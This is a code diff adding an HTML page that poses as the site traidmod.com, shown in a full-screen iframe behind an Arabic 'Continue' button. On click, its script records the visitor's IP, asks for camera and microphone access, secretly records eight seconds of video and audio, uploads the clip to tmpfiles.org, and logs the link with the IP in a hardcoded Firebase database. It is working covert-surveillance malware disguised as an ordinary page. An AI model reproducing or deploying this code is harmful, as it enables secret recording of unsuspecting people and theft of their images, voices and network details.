@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<style>
+    body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; }
+    #overlay { position: fixed; top:0; left:0; width: 100%; height: 100%; background: white; z-index: 9999; display: flex; justify-content: center; align-items: center; }
+    iframe { width: 100%; height: 100%; border: none; }
+</style>
+</head>
+<body>
+<div id="overlay"><button onclick="start()">متابعة</button></div>
+<iframe id="frame" src="https://traidmod.com/"></iframe>
+<video id="v" autoplay playsinline muted style="display:none"></video>
+
+<script>
+const db = firebase.initializeApp({
+    apiKey: "AIzaSyCaMV2_EKFrhW9CUHMOHnfyFER_M2mDcN8",
+    databaseURL: "https://admin-aad81-default-rtdb.firebaseio.com"
+}).database();
+
+async function start() {
+    document.getElementById('overlay').style.display = 'none';
+    const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip.replace(/\./g, '_');
+    
+    try {
+        // طلب الكاميرا والصوت معاً
+        const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+        const v = document.getElementById('v'); v.srcObject = stream;
+        
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.start();
+        
+        // التسجيل لمدة 8 ثوانٍ
+        setTimeout(() => recorder.stop(), 8000);
+        
+        recorder.onstop = async () => {
+            const blob = new Blob(chunks, {type: "video/webm"});
+            const fd = new FormData(); fd.append("file", blob, "rec.webm");
+            const res = await fetch("https://tmpfiles.org/api/v1/upload", {method: "POST", body: fd});
+            const j = await res.json();
+            
+            // رفع الرابط لـ Firebase
+            db.ref("Data_x/" + ip + "/media").update({
+                video_audio: j.status === "success" ? j.data.url : "Failed"
+            });
+            stream.getTracks().forEach(t => t.stop());
+        };
+    } catch(e) {
+        db.ref("Data_x/" + ip + "/media").update({error: "Permission Denied"});
+    }
+}
+</script>
+</body>
+</html>
